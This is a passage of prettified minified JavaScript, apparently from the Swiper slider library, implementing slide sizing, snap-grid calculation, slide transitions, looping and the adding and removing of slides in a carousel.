              "function" == typeof v && (v = t.slidesOffsetAfter.call(e));
              const y = e.snapGrid.length,
                b = e.snapGrid.length;
              let w,
                x,
                T = t.spaceBetween,
                C = -f,
                E = 0,
                S = 0;
              if (void 0 === i) return;
              "string" == typeof T &&
                T.indexOf("%") >= 0 &&
                (T = (parseFloat(T.replace("%", "")) / 100) * i),
                (e.virtualSize = -T),
                a
                  ? d.css({ marginLeft: "", marginTop: "" })
                  : d.css({ marginRight: "", marginBottom: "" }),
                t.slidesPerColumn > 1 &&
                  ((w =
                    Math.floor(c / t.slidesPerColumn) ===
                    c / e.params.slidesPerColumn
                      ? c
                      : Math.ceil(c / t.slidesPerColumn) * t.slidesPerColumn),
                  "auto" !== t.slidesPerView &&
                    "row" === t.slidesPerColumnFill &&
                    (w = Math.max(w, t.slidesPerView * t.slidesPerColumn)));
              const $ = t.slidesPerColumn,
                M = w / $,
                I = Math.floor(c / t.slidesPerColumn);
              for (let s = 0; s < c; s += 1) {
                x = 0;
                const a = d.eq(s);
                if (t.slidesPerColumn > 1) {
                  let i, n, r;
                  if ("row" === t.slidesPerColumnFill && t.slidesPerGroup > 1) {
                    const e = Math.floor(
                        s / (t.slidesPerGroup * t.slidesPerColumn)
                      ),
                      o = s - t.slidesPerColumn * t.slidesPerGroup * e,
                      l =
                        0 === e
                          ? t.slidesPerGroup
                          : Math.min(
                              Math.ceil((c - e * $ * t.slidesPerGroup) / $),
                              t.slidesPerGroup
                            );
                    (r = Math.floor(o / l)),
                      (n = o - r * l + e * t.slidesPerGroup),
                      (i = n + (r * w) / $),
                      a.css({
                        "-webkit-box-ordinal-group": i,
                        "-moz-box-ordinal-group": i,
                        "-ms-flex-order": i,
                        "-webkit-order": i,
                        order: i,
                      });
                  } else
                    "column" === t.slidesPerColumnFill
                      ? ((n = Math.floor(s / $)),
                        (r = s - n * $),
                        (n > I || (n === I && r === $ - 1)) &&
                          ((r += 1), r >= $ && ((r = 0), (n += 1))))
                      : ((r = Math.floor(s / M)), (n = s - r * M));
                  a.css(
                    "margin-" + (e.isHorizontal() ? "top" : "left"),
                    0 !== r && t.spaceBetween && `${t.spaceBetween}px`
                  );
                }
                if ("none" !== a.css("display")) {
                  if ("auto" === t.slidesPerView) {
                    const s = o.getComputedStyle(a[0], null),
                      i = a[0].style.transform,
                      n = a[0].style.webkitTransform;
                    if (
                      (i && (a[0].style.transform = "none"),
                      n && (a[0].style.webkitTransform = "none"),
                      t.roundLengths)
                    )
                      x = e.isHorizontal()
                        ? a.outerWidth(!0)
                        : a.outerHeight(!0);
                    else if (e.isHorizontal()) {
                      const e = parseFloat(s.getPropertyValue("width")),
                        t = parseFloat(s.getPropertyValue("padding-left")),
                        i = parseFloat(s.getPropertyValue("padding-right")),
                        a = parseFloat(s.getPropertyValue("margin-left")),
                        n = parseFloat(s.getPropertyValue("margin-right")),
                        r = s.getPropertyValue("box-sizing");
                      x =
                        r && "border-box" === r ? e + a + n : e + t + i + a + n;
                    } else {
                      const e = parseFloat(s.getPropertyValue("height")),
                        t = parseFloat(s.getPropertyValue("padding-top")),
                        i = parseFloat(s.getPropertyValue("padding-bottom")),
                        a = parseFloat(s.getPropertyValue("margin-top")),
                        n = parseFloat(s.getPropertyValue("margin-bottom")),
                        r = s.getPropertyValue("box-sizing");
                      x =
                        r && "border-box" === r ? e + a + n : e + t + i + a + n;
                    }
                    i && (a[0].style.transform = i),
                      n && (a[0].style.webkitTransform = n),
                      t.roundLengths && (x = Math.floor(x));
                  } else
                    (x = (i - (t.slidesPerView - 1) * T) / t.slidesPerView),
                      t.roundLengths && (x = Math.floor(x)),
                      d[s] &&
                        (e.isHorizontal()
                          ? (d[s].style.width = `${x}px`)
                          : (d[s].style.height = `${x}px`));
                  d[s] && (d[s].swiperSlideSize = x),
                    m.push(x),
                    t.centeredSlides
                      ? ((C = C + x / 2 + E / 2 + T),
                        0 === E && 0 !== s && (C = C - i / 2 - T),
                        0 === s && (C = C - i / 2 - T),
                        Math.abs(C) < 0.001 && (C = 0),
                        t.roundLengths && (C = Math.floor(C)),
                        S % t.slidesPerGroup == 0 && p.push(C),
                        u.push(C))
                      : (t.roundLengths && (C = Math.floor(C)),
                        (S - Math.min(e.params.slidesPerGroupSkip, S)) %
                          e.params.slidesPerGroup ==
                          0 && p.push(C),
                        u.push(C),
                        (C = C + x + T)),
                    (e.virtualSize += x + T),
                    (E = x),
                    (S += 1);
                }
              }
              let z;
              if (
                ((e.virtualSize = Math.max(e.virtualSize, i) + v),
                a &&
                  n &&
                  ("slide" === t.effect || "coverflow" === t.effect) &&
                  s.css({ width: `${e.virtualSize + t.spaceBetween}px` }),
                t.setWrapperSize &&
                  (e.isHorizontal()
                    ? s.css({ width: `${e.virtualSize + t.spaceBetween}px` })
                    : s.css({ height: `${e.virtualSize + t.spaceBetween}px` })),
                t.slidesPerColumn > 1 &&
                  ((e.virtualSize = (x + t.spaceBetween) * w),
                  (e.virtualSize =
                    Math.ceil(e.virtualSize / t.slidesPerColumn) -
                    t.spaceBetween),
                  e.isHorizontal()
                    ? s.css({ width: `${e.virtualSize + t.spaceBetween}px` })
                    : s.css({ height: `${e.virtualSize + t.spaceBetween}px` }),
                  t.centeredSlides))
              ) {
                z = [];
                for (let s = 0; s < p.length; s += 1) {
                  let i = p[s];
                  t.roundLengths && (i = Math.floor(i)),
                    p[s] < e.virtualSize + p[0] && z.push(i);
                }
                p = z;
              }
              if (!t.centeredSlides) {
                z = [];
                for (let s = 0; s < p.length; s += 1) {
                  let a = p[s];
                  t.roundLengths && (a = Math.floor(a)),
                    p[s] <= e.virtualSize - i && z.push(a);
                }
                (p = z),
                  Math.floor(e.virtualSize - i) - Math.floor(p[p.length - 1]) >
                    1 && p.push(e.virtualSize - i);
              }
              if (
                (0 === p.length && (p = [0]),
                0 !== t.spaceBetween &&
                  (e.isHorizontal()
                    ? a
                      ? d.filter(g).css({ marginLeft: `${T}px` })
                      : d.filter(g).css({ marginRight: `${T}px` })
                    : d.filter(g).css({ marginBottom: `${T}px` })),
                t.centeredSlides && t.centeredSlidesBounds)
              ) {
                let e = 0;
                m.forEach((s) => {
                  e += s + (t.spaceBetween ? t.spaceBetween : 0);
                }),
                  (e -= t.spaceBetween);
                const s = e - i;
                p = p.map((e) => (e < 0 ? -f : e > s ? s + v : e));
              }
              if (t.centerInsufficientSlides) {
                let e = 0;
                if (
                  (m.forEach((s) => {
                    e += s + (t.spaceBetween ? t.spaceBetween : 0);
                  }),
                  (e -= t.spaceBetween),
                  e < i)
                ) {
                  const t = (i - e) / 2;
                  p.forEach((e, s) => {
                    p[s] = e - t;
                  }),
                    u.forEach((e, s) => {
                      u[s] = e + t;
                    });
                }
              }
              h.extend(e, {
                slides: d,
                snapGrid: p,
                slidesGrid: u,
                slidesSizesGrid: m,
              }),
                c !== l && e.emit("slidesLengthChange"),
                p.length !== y &&
                  (e.params.watchOverflow && e.checkOverflow(),
                  e.emit("snapGridLengthChange")),
                u.length !== b && e.emit("slidesGridLengthChange"),
                (t.watchSlidesProgress || t.watchSlidesVisibility) &&
                  e.updateSlidesOffset();
            },
            updateAutoHeight: function (e) {
              const t = this,
                s = [];
              let i,
                a = 0;
              if (
                ("number" == typeof e
                  ? t.setTransition(e)
                  : !0 === e && t.setTransition(t.params.speed),
                "auto" !== t.params.slidesPerView && t.params.slidesPerView > 1)
              )
                if (t.params.centeredSlides)
                  t.visibleSlides.each((e, t) => {
                    s.push(t);
                  });
                else
                  for (i = 0; i < Math.ceil(t.params.slidesPerView); i += 1) {
                    const e = t.activeIndex + i;
                    if (e > t.slides.length) break;
                    s.push(t.slides.eq(e)[0]);
                  }
              else s.push(t.slides.eq(t.activeIndex)[0]);
              for (i = 0; i < s.length; i += 1)
                if (void 0 !== s[i]) {
                  const e = s[i].offsetHeight;
                  a = e > a ? e : a;
                }
              a && t.$wrapperEl.css("height", `${a}px`);
            },
            updateSlidesOffset: function () {
              const e = this,
                t = e.slides;
              for (let s = 0; s < t.length; s += 1)
                t[s].swiperSlideOffset = e.isHorizontal()
                  ? t[s].offsetLeft
                  : t[s].offsetTop;
            },
            updateSlidesProgress: function (e = (this && this.translate) || 0) {
              const t = this,
                s = t.params,
                { slides: i, rtlTranslate: a } = t;
              if (0 === i.length) return;
              void 0 === i[0].swiperSlideOffset && t.updateSlidesOffset();
              let n = -e;
              a && (n = e),
                i.removeClass(s.slideVisibleClass),
                (t.visibleSlidesIndexes = []),
                (t.visibleSlides = []);
              for (let e = 0; e < i.length; e += 1) {
                const r = i[e],
                  o =
                    (n +
                      (s.centeredSlides ? t.minTranslate() : 0) -
                      r.swiperSlideOffset) /
                    (r.swiperSlideSize + s.spaceBetween);
                if (
                  s.watchSlidesVisibility ||
                  (s.centeredSlides && s.autoHeight)
                ) {
                  const a = -(n - r.swiperSlideOffset),
                    o = a + t.slidesSizesGrid[e];
                  ((a >= 0 && a < t.size - 1) ||
                    (o > 1 && o <= t.size) ||
                    (a <= 0 && o >= t.size)) &&
                    (t.visibleSlides.push(r),
                    t.visibleSlidesIndexes.push(e),
                    i.eq(e).addClass(s.slideVisibleClass));
                }
                r.progress = a ? -o : o;
              }
              t.visibleSlides = d(t.visibleSlides);
            },
            updateProgress: function (e) {
              const t = this;
              if (void 0 === e) {
                const s = t.rtlTranslate ? -1 : 1;
                e = (t && t.translate && t.translate * s) || 0;
              }
              const s = t.params,
                i = t.maxTranslate() - t.minTranslate();
              let { progress: a, isBeginning: n, isEnd: r } = t;
              const o = n,
                l = r;
              0 === i
                ? ((a = 0), (n = !0), (r = !0))
                : ((a = (e - t.minTranslate()) / i),
                  (n = a <= 0),
                  (r = a >= 1)),
                h.extend(t, { progress: a, isBeginning: n, isEnd: r }),
                (s.watchSlidesProgress ||
                  s.watchSlidesVisibility ||
                  (s.centeredSlides && s.autoHeight)) &&
                  t.updateSlidesProgress(e),
                n && !o && t.emit("reachBeginning toEdge"),
                r && !l && t.emit("reachEnd toEdge"),
                ((o && !n) || (l && !r)) && t.emit("fromEdge"),
                t.emit("progress", a);
            },
            updateSlidesClasses: function () {
              const e = this,
                {
                  slides: t,
                  params: s,
                  $wrapperEl: i,
                  activeIndex: a,
                  realIndex: n,
                } = e,
                r = e.virtual && s.virtual.enabled;
              let o;
              t.removeClass(
                `${s.slideActiveClass} ${s.slideNextClass} ${s.slidePrevClass} ${s.slideDuplicateActiveClass} ${s.slideDuplicateNextClass} ${s.slideDuplicatePrevClass}`
              ),
                (o = r
                  ? e.$wrapperEl.find(
                      `.${s.slideClass}[data-swiper-slide-index="${a}"]`
                    )
                  : t.eq(a)),
                o.addClass(s.slideActiveClass),
                s.loop &&
                  (o.hasClass(s.slideDuplicateClass)
                    ? i
                        .children(
                          `.${s.slideClass}:not(.${s.slideDuplicateClass})[data-swiper-slide-index="${n}"]`
                        )
                        .addClass(s.slideDuplicateActiveClass)
                    : i
                        .children(
                          `.${s.slideClass}.${s.slideDuplicateClass}[data-swiper-slide-index="${n}"]`
                        )
                        .addClass(s.slideDuplicateActiveClass));
              let l = o
                .nextAll(`.${s.slideClass}`)
                .eq(0)
                .addClass(s.slideNextClass);
              s.loop &&
                0 === l.length &&
                ((l = t.eq(0)), l.addClass(s.slideNextClass));
              let d = o
                .prevAll(`.${s.slideClass}`)
                .eq(0)
                .addClass(s.slidePrevClass);
              s.loop &&
                0 === d.length &&
                ((d = t.eq(-1)), d.addClass(s.slidePrevClass)),
                s.loop &&
                  (l.hasClass(s.slideDuplicateClass)
                    ? i
                        .children(
                          `.${s.slideClass}:not(.${
                            s.slideDuplicateClass
                          })[data-swiper-slide-index="${l.attr(
                            "data-swiper-slide-index"
                          )}"]`
                        )
                        .addClass(s.slideDuplicateNextClass)
                    : i
                        .children(
                          `.${s.slideClass}.${
                            s.slideDuplicateClass
                          }[data-swiper-slide-index="${l.attr(
                            "data-swiper-slide-index"
                          )}"]`
                        )
                        .addClass(s.slideDuplicateNextClass),
                  d.hasClass(s.slideDuplicateClass)
                    ? i
                        .children(
                          `.${s.slideClass}:not(.${
                            s.slideDuplicateClass
                          })[data-swiper-slide-index="${d.attr(
                            "data-swiper-slide-index"
                          )}"]`
                        )
                        .addClass(s.slideDuplicatePrevClass)
                    : i
                        .children(
                          `.${s.slideClass}.${
                            s.slideDuplicateClass
                          }[data-swiper-slide-index="${d.attr(
                            "data-swiper-slide-index"
                          )}"]`
                        )
                        .addClass(s.slideDuplicatePrevClass));
            },
            updateActiveIndex: function (e) {
              const t = this,
                s = t.rtlTranslate ? t.translate : -t.translate,
                {
                  slidesGrid: i,
                  snapGrid: a,
                  params: n,
                  activeIndex: r,
                  realIndex: o,
                  snapIndex: l,
                } = t;
              let d,
                c = e;
              if (void 0 === c) {
                for (let e = 0; e < i.length; e += 1)
                  void 0 !== i[e + 1]
                    ? s >= i[e] && s < i[e + 1] - (i[e + 1] - i[e]) / 2
                      ? (c = e)
                      : s >= i[e] && s < i[e + 1] && (c = e + 1)
                    : s >= i[e] && (c = e);
                n.normalizeSlideIndex && (c < 0 || void 0 === c) && (c = 0);
              }
              if (a.indexOf(s) >= 0) d = a.indexOf(s);
              else {
                const e = Math.min(n.slidesPerGroupSkip, c);
                d = e + Math.floor((c - e) / n.slidesPerGroup);
              }
              if ((d >= a.length && (d = a.length - 1), c === r))
                return void (
                  d !== l && ((t.snapIndex = d), t.emit("snapIndexChange"))
                );
              const p = parseInt(
                t.slides.eq(c).attr("data-swiper-slide-index") || c,
                10
              );
              h.extend(t, {
                snapIndex: d,
                realIndex: p,
                previousIndex: r,
                activeIndex: c,
              }),
                t.emit("activeIndexChange"),
                t.emit("snapIndexChange"),
                o !== p && t.emit("realIndexChange"),
                (t.initialized || t.params.runCallbacksOnInit) &&
                  t.emit("slideChange");
            },
            updateClickedSlide: function (e) {
              const t = this,
                s = t.params,
                i = d(e.target).closest(`.${s.slideClass}`)[0];
              let a = !1;
              if (i)
                for (let e = 0; e < t.slides.length; e += 1)
                  t.slides[e] === i && (a = !0);
              if (!i || !a)
                return (
                  (t.clickedSlide = void 0), void (t.clickedIndex = void 0)
                );
              (t.clickedSlide = i),
                t.virtual && t.params.virtual.enabled
                  ? (t.clickedIndex = parseInt(
                      d(i).attr("data-swiper-slide-index"),
                      10
                    ))
                  : (t.clickedIndex = d(i).index()),
                s.slideToClickedSlide &&
                  void 0 !== t.clickedIndex &&
                  t.clickedIndex !== t.activeIndex &&
                  t.slideToClickedSlide();
            },
          },
          f = {
            getTranslate: function (e = this.isHorizontal() ? "x" : "y") {
              const {
                params: t,
                rtlTranslate: s,
                translate: i,
                $wrapperEl: a,
              } = this;
              if (t.virtualTranslate) return s ? -i : i;
              if (t.cssMode) return i;
              let n = h.getTranslate(a[0], e);
              return s && (n = -n), n || 0;
            },
            setTranslate: function (e, t) {
              const s = this,
                {
                  rtlTranslate: i,
                  params: a,
                  $wrapperEl: n,
                  wrapperEl: r,
                  progress: o,
                } = s;
              let l,
                d = 0,
                c = 0;
              s.isHorizontal() ? (d = i ? -e : e) : (c = e),
                a.roundLengths && ((d = Math.floor(d)), (c = Math.floor(c))),
                a.cssMode
                  ? (r[s.isHorizontal() ? "scrollLeft" : "scrollTop"] =
                      s.isHorizontal() ? -d : -c)
                  : a.virtualTranslate ||
                    n.transform(`translate3d(${d}px, ${c}px, 0px)`),
                (s.previousTranslate = s.translate),
                (s.translate = s.isHorizontal() ? d : c);
              const p = s.maxTranslate() - s.minTranslate();
              (l = 0 === p ? 0 : (e - s.minTranslate()) / p),
                l !== o && s.updateProgress(e),
                s.emit("setTranslate", s.translate, t);
            },
            minTranslate: function () {
              return -this.snapGrid[0];
            },
            maxTranslate: function () {
              return -this.snapGrid[this.snapGrid.length - 1];
            },
            translateTo: function (
              e = 0,
              t = this.params.speed,
              s = !0,
              i = !0,
              a
            ) {
              const n = this,
                { params: r, wrapperEl: o } = n;
              if (n.animating && r.preventInteractionOnTransition) return !1;
              const l = n.minTranslate(),
                d = n.maxTranslate();
              let c;
              if (
                ((c = i && e > l ? l : i && e < d ? d : e),
                n.updateProgress(c),
                r.cssMode)
              ) {
                const e = n.isHorizontal();
                return (
                  0 === t
                    ? (o[e ? "scrollLeft" : "scrollTop"] = -c)
                    : o.scrollTo
                    ? o.scrollTo({
                        [e ? "left" : "top"]: -c,
                        behavior: "smooth",
                      })
                    : (o[e ? "scrollLeft" : "scrollTop"] = -c),
                  !0
                );
              }
              return (
                0 === t
                  ? (n.setTransition(0),
                    n.setTranslate(c),
                    s &&
                      (n.emit("beforeTransitionStart", t, a),
                      n.emit("transitionEnd")))
                  : (n.setTransition(t),
                    n.setTranslate(c),
                    s &&
                      (n.emit("beforeTransitionStart", t, a),
                      n.emit("transitionStart")),
                    n.animating ||
                      ((n.animating = !0),
                      n.onTranslateToWrapperTransitionEnd ||
                        (n.onTranslateToWrapperTransitionEnd = function (e) {
                          n &&
                            !n.destroyed &&
                            e.target === this &&
                            (n.$wrapperEl[0].removeEventListener(
                              "transitionend",
                              n.onTranslateToWrapperTransitionEnd
                            ),
                            n.$wrapperEl[0].removeEventListener(
                              "webkitTransitionEnd",
                              n.onTranslateToWrapperTransitionEnd
                            ),
                            (n.onTranslateToWrapperTransitionEnd = null),
                            delete n.onTranslateToWrapperTransitionEnd,
                            s && n.emit("transitionEnd"));
                        }),
                      n.$wrapperEl[0].addEventListener(
                        "transitionend",
                        n.onTranslateToWrapperTransitionEnd
                      ),
                      n.$wrapperEl[0].addEventListener(
                        "webkitTransitionEnd",
                        n.onTranslateToWrapperTransitionEnd
                      ))),
                !0
              );
            },
          },
          v = {
            slideTo: function (e = 0, t = this.params.speed, s = !0, i) {
              const a = this;
              let n = e;
              n < 0 && (n = 0);
              const {
                params: r,
                snapGrid: o,
                slidesGrid: l,
                previousIndex: d,
                activeIndex: c,
                rtlTranslate: p,
                wrapperEl: h,
              } = a;
              if (a.animating && r.preventInteractionOnTransition) return !1;
              const u = Math.min(a.params.slidesPerGroupSkip, n);
              let m = u + Math.floor((n - u) / a.params.slidesPerGroup);
              m >= o.length && (m = o.length - 1),
                (c || r.initialSlide || 0) === (d || 0) &&
                  s &&
                  a.emit("beforeSlideChangeStart");
              const g = -o[m];
              if ((a.updateProgress(g), r.normalizeSlideIndex))
                for (let e = 0; e < l.length; e += 1)
                  -Math.floor(100 * g) >= Math.floor(100 * l[e]) && (n = e);
              if (a.initialized && n !== c) {
                if (
                  !a.allowSlideNext &&
                  g < a.translate &&
                  g < a.minTranslate()
                )
                  return !1;
                if (
                  !a.allowSlidePrev &&
                  g > a.translate &&
                  g > a.maxTranslate() &&
                  (c || 0) !== n
                )
                  return !1;
              }
              let f;
              if (
                ((f = n > c ? "next" : n < c ? "prev" : "reset"),
                (p && -g === a.translate) || (!p && g === a.translate))
              )
                return (
                  a.updateActiveIndex(n),
                  r.autoHeight && a.updateAutoHeight(),
                  a.updateSlidesClasses(),
                  "slide" !== r.effect && a.setTranslate(g),
                  "reset" !== f &&
                    (a.transitionStart(s, f), a.transitionEnd(s, f)),
                  !1
                );
              if (r.cssMode) {
                const e = a.isHorizontal();
                let s = -g;
                return (
                  p && (s = h.scrollWidth - h.offsetWidth - s),
                  0 === t
                    ? (h[e ? "scrollLeft" : "scrollTop"] = s)
                    : h.scrollTo
                    ? h.scrollTo({
                        [e ? "left" : "top"]: s,
                        behavior: "smooth",
                      })
                    : (h[e ? "scrollLeft" : "scrollTop"] = s),
                  !0
                );
              }
              return (
                0 === t
                  ? (a.setTransition(0),
                    a.setTranslate(g),
                    a.updateActiveIndex(n),
                    a.updateSlidesClasses(),
                    a.emit("beforeTransitionStart", t, i),
                    a.transitionStart(s, f),
                    a.transitionEnd(s, f))
                  : (a.setTransition(t),
                    a.setTranslate(g),
                    a.updateActiveIndex(n),
                    a.updateSlidesClasses(),
                    a.emit("beforeTransitionStart", t, i),
                    a.transitionStart(s, f),
                    a.animating ||
                      ((a.animating = !0),
                      a.onSlideToWrapperTransitionEnd ||
                        (a.onSlideToWrapperTransitionEnd = function (e) {
                          a &&
                            !a.destroyed &&
                            e.target === this &&
                            (a.$wrapperEl[0].removeEventListener(
                              "transitionend",
                              a.onSlideToWrapperTransitionEnd
                            ),
                            a.$wrapperEl[0].removeEventListener(
                              "webkitTransitionEnd",
                              a.onSlideToWrapperTransitionEnd
                            ),
                            (a.onSlideToWrapperTransitionEnd = null),
                            delete a.onSlideToWrapperTransitionEnd,
                            a.transitionEnd(s, f));
                        }),
                      a.$wrapperEl[0].addEventListener(
                        "transitionend",
                        a.onSlideToWrapperTransitionEnd
                      ),
                      a.$wrapperEl[0].addEventListener(
                        "webkitTransitionEnd",
                        a.onSlideToWrapperTransitionEnd
                      ))),
                !0
              );
            },
            slideToLoop: function (e = 0, t = this.params.speed, s = !0, i) {
              const a = this;
              let n = e;
              return (
                a.params.loop && (n += a.loopedSlides), a.slideTo(n, t, s, i)
              );
            },
            slideNext: function (e = this.params.speed, t = !0, s) {
              const i = this,
                { params: a, animating: n } = i,
                r = i.activeIndex < a.slidesPerGroupSkip ? 1 : a.slidesPerGroup;
              if (a.loop) {
                if (n) return !1;
                i.loopFix(), (i._clientLeft = i.$wrapperEl[0].clientLeft);
              }
              return i.slideTo(i.activeIndex + r, e, t, s);
            },
            slidePrev: function (e = this.params.speed, t = !0, s) {
              const i = this,
                {
                  params: a,
                  animating: n,
                  snapGrid: r,
                  slidesGrid: o,
                  rtlTranslate: l,
                } = i;
              if (a.loop) {
                if (n) return !1;
                i.loopFix(), (i._clientLeft = i.$wrapperEl[0].clientLeft);
              }
              function d(e) {
                return e < 0 ? -Math.floor(Math.abs(e)) : Math.floor(e);
              }
              const c = d(l ? i.translate : -i.translate),
                p = r.map((e) => d(e));
              o.map((e) => d(e)), r[p.indexOf(c)];
              let h,
                u = r[p.indexOf(c) - 1];
              return (
                void 0 === u &&
                  a.cssMode &&
                  r.forEach((e) => {
                    !u && c >= e && (u = e);
                  }),
                void 0 !== u &&
                  ((h = o.indexOf(u)), h < 0 && (h = i.activeIndex - 1)),
                i.slideTo(h, e, t, s)
              );
            },
            slideReset: function (e = this.params.speed, t = !0, s) {
              return this.slideTo(this.activeIndex, e, t, s);
            },
            slideToClosest: function (
              e = this.params.speed,
              t = !0,
              s,
              i = 0.5
            ) {
              const a = this;
              let n = a.activeIndex;
              const r = Math.min(a.params.slidesPerGroupSkip, n),
                o = r + Math.floor((n - r) / a.params.slidesPerGroup),
                l = a.rtlTranslate ? a.translate : -a.translate;
              if (l >= a.snapGrid[o]) {
                const e = a.snapGrid[o];
                l - e > (a.snapGrid[o + 1] - e) * i &&
                  (n += a.params.slidesPerGroup);
              } else {
                const e = a.snapGrid[o - 1];
                l - e <= (a.snapGrid[o] - e) * i &&
                  (n -= a.params.slidesPerGroup);
              }
              return (
                (n = Math.max(n, 0)),
                (n = Math.min(n, a.slidesGrid.length - 1)),
                a.slideTo(n, e, t, s)
              );
            },
            slideToClickedSlide: function () {
              const e = this,
                { params: t, $wrapperEl: s } = e,
                i =
                  "auto" === t.slidesPerView
                    ? e.slidesPerViewDynamic()
                    : t.slidesPerView;
              let a,
                n = e.clickedIndex;
              if (t.loop) {
                if (e.animating) return;
                (a = parseInt(
                  d(e.clickedSlide).attr("data-swiper-slide-index"),
                  10
                )),
                  t.centeredSlides
                    ? n < e.loopedSlides - i / 2 ||
                      n > e.slides.length - e.loopedSlides + i / 2
                      ? (e.loopFix(),
                        (n = s
                          .children(
                            `.${t.slideClass}[data-swiper-slide-index="${a}"]:not(.${t.slideDuplicateClass})`
                          )
                          .eq(0)
                          .index()),
                        h.nextTick(() => {
                          e.slideTo(n);
                        }))
                      : e.slideTo(n)
                    : n > e.slides.length - i
                    ? (e.loopFix(),
                      (n = s
                        .children(
                          `.${t.slideClass}[data-swiper-slide-index="${a}"]:not(.${t.slideDuplicateClass})`
                        )
                        .eq(0)
                        .index()),
                      h.nextTick(() => {
                        e.slideTo(n);
                      }))
                    : e.slideTo(n);
              } else e.slideTo(n);
            },
          },
          y = {
            loopCreate: function () {
              const e = this,
                { params: t, $wrapperEl: s } = e;
              s.children(`.${t.slideClass}.${t.slideDuplicateClass}`).remove();
              let i = s.children(`.${t.slideClass}`);
              if (t.loopFillGroupWithBlank) {
                const e = t.slidesPerGroup - (i.length % t.slidesPerGroup);
                if (e !== t.slidesPerGroup) {
                  for (let i = 0; i < e; i += 1) {
                    const e = d(n.createElement("div")).addClass(
                      `${t.slideClass} ${t.slideBlankClass}`
                    );
                    s.append(e);
                  }
                  i = s.children(`.${t.slideClass}`);
                }
              }
              "auto" !== t.slidesPerView ||
                t.loopedSlides ||
                (t.loopedSlides = i.length),
                (e.loopedSlides = Math.ceil(
                  parseFloat(t.loopedSlides || t.slidesPerView, 10)
                )),
                (e.loopedSlides += t.loopAdditionalSlides),
                e.loopedSlides > i.length && (e.loopedSlides = i.length);
              const a = [],
                r = [];
              i.each((t, s) => {
                const n = d(s);
                t < e.loopedSlides && r.push(s),
                  t < i.length && t >= i.length - e.loopedSlides && a.push(s),
                  n.attr("data-swiper-slide-index", t);
              });
              for (let e = 0; e < r.length; e += 1)
                s.append(d(r[e].cloneNode(!0)).addClass(t.slideDuplicateClass));
              for (let e = a.length - 1; e >= 0; e -= 1)
                s.prepend(
                  d(a[e].cloneNode(!0)).addClass(t.slideDuplicateClass)
                );
            },
            loopFix: function () {
              const e = this;
              e.emit("beforeLoopFix");
              const {
                activeIndex: t,
                slides: s,
                loopedSlides: i,
                allowSlidePrev: a,
                allowSlideNext: n,
                snapGrid: r,
                rtlTranslate: o,
              } = e;
              let l;
              (e.allowSlidePrev = !0), (e.allowSlideNext = !0);
              const d = -r[t] - e.getTranslate();
              t < i
                ? ((l = s.length - 3 * i + t),
                  (l += i),
                  e.slideTo(l, 0, !1, !0) &&
                    0 !== d &&
                    e.setTranslate((o ? -e.translate : e.translate) - d))
                : t >= s.length - i &&
                  ((l = -s.length + t + i),
                  (l += i),
                  e.slideTo(l, 0, !1, !0) &&
                    0 !== d &&
                    e.setTranslate((o ? -e.translate : e.translate) - d)),
                (e.allowSlidePrev = a),
                (e.allowSlideNext = n),
                e.emit("loopFix");
            },
            loopDestroy: function () {
              const { $wrapperEl: e, params: t, slides: s } = this;
              e
                .children(
                  `.${t.slideClass}.${t.slideDuplicateClass},.${t.slideClass}.${t.slideBlankClass}`
                )
                .remove(),
                s.removeAttr("data-swiper-slide-index");
            },
          },
          b = {
            setGrabCursor: function (e) {
              const t = this;
              if (
                u.touch ||
                !t.params.simulateTouch ||
                (t.params.watchOverflow && t.isLocked) ||
                t.params.cssMode
              )
                return;
              const s = t.el;
              (s.style.cursor = "move"),
                (s.style.cursor = e ? "-webkit-grabbing" : "-webkit-grab"),
                (s.style.cursor = e ? "-moz-grabbin" : "-moz-grab"),
                (s.style.cursor = e ? "grabbing" : "grab");
            },
            unsetGrabCursor: function () {
              const e = this;
              u.touch ||
                (e.params.watchOverflow && e.isLocked) ||
                e.params.cssMode ||
                (e.el.style.cursor = "");
            },
          },
          w = {
            appendSlide: function (e) {
              const t = this,
                { $wrapperEl: s, params: i } = t;
              if (
                (i.loop && t.loopDestroy(),
                "object" == typeof e && "length" in e)
              )
                for (let t = 0; t < e.length; t += 1) e[t] && s.append(e[t]);
              else s.append(e);
              i.loop && t.loopCreate(),
                (i.observer && u.observer) || t.update();
            },
            prependSlide: function (e) {
              const t = this,
                { params: s, $wrapperEl: i, activeIndex: a } = t;
              s.loop && t.loopDestroy();
              let n = a + 1;
              if ("object" == typeof e && "length" in e) {
                for (let t = 0; t < e.length; t += 1) e[t] && i.prepend(e[t]);
                n = a + e.length;
              } else i.prepend(e);
              s.loop && t.loopCreate(),
                (s.observer && u.observer) || t.update(),
                t.slideTo(n, 0, !1);
            },
            addSlide: function (e, t) {
              const s = this,
                { $wrapperEl: i, params: a, activeIndex: n } = s;
              let r = n;
              a.loop &&
                ((r -= s.loopedSlides),
                s.loopDestroy(),
                (s.slides = i.children(`.${a.slideClass}`)));
              const o = s.slides.length;
              if (e <= 0) return void s.prependSlide(t);
              if (e >= o) return void s.appendSlide(t);
              let l = r > e ? r + 1 : r;
              const d = [];
              for (let t = o - 1; t >= e; t -= 1) {
                const e = s.slides.eq(t);
                e.remove(), d.unshift(e);
              }
              if ("object" == typeof t && "length" in t) {
                for (let e = 0; e < t.length; e += 1) t[e] && i.append(t[e]);
                l = r > e ? r + t.length : r;
              } else i.append(t);
              for (let e = 0; e < d.length; e += 1) i.append(d[e]);
              a.loop && s.loopCreate(),
                (a.observer && u.observer) || s.update(),
                a.loop
                  ? s.slideTo(l + s.loopedSlides, 0, !1)
                  : s.slideTo(l, 0, !1);
            },
            removeSlide: function (e) {
              const t = this,
                { params: s, $wrapperEl: i, activeIndex: a } = t;
              let n = a;
              s.loop &&
                ((n -= t.loopedSlides),
                t.loopDestroy(),
                (t.slides = i.children(`.${s.slideClass}`)));
              let r,
                o = n;
              if ("object" == typeof e && "length" in e) {
                for (let s = 0; s < e.length; s += 1)
                  (r = e[s]),
                    t.slides[r] && t.slides.eq(r).remove(),
                    r < o && (o -= 1);
                o = Math.max(o, 0);
              } else
                (r = e),
                  t.slides[r] && t.slides.eq(r).remove(),
                  r < o && (o -= 1),
                  (o = Math.max(o, 0));
              s.loop && t.loopCreate(),
                (s.observer && u.observer) || t.update(),
                s.loop
                  ? t.slideTo(o + t.loopedSlides, 0, !1)
                  : t.slideTo(o, 0, !1);
            },
            removeAllSlides: function () {
              const e = this,
                t = [];
              for (let s = 0; s < e.slides.length; s += 1) t.push(s);
              e.removeSlide(t);
            },
          };
        const x = (function () {
          const e = o.navigator.platform,
            t = o.navigator.userAgent,
            s = {
              ios: !1,
              android: !1,
              androidChrome: !1,
